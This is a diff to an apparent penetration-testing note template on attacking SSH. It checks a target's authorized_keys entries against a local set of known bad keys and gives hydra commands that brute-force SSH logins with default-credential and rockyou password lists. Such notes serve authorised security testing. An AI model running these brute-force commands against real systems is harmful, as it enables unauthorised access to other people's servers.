@@ -1,8 +1,10 @@
+#service 
 <% tp.file.rename("1_SSH_")%>
+☑️
 #### Bad Keys
 Get entries from targets `authorized_keys` file. Then:
 ```
-$auth_key="";grep -lr $auth_key /home/kali/Documents/SSHKeys/
+auth_key="";grep -lr $auth_key /home/kali/Documents/SSHKeys/
 ```
 
 #### Bruteforce default credentials
@@ -12,7 +14,7 @@ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpass
 
 Or for a given user:
 ```bash
-hydra -l $user -P /usr/share/wordlists/rockyou30.txt ssh://$hip$ -V -t 4 -I -s 22
+hydra -l $user -P /usr/share/wordlists/rockyou30.txt ssh://$hip -V -t 4 -I -s 22
 ```
 (pass userlist with `-L`)
 
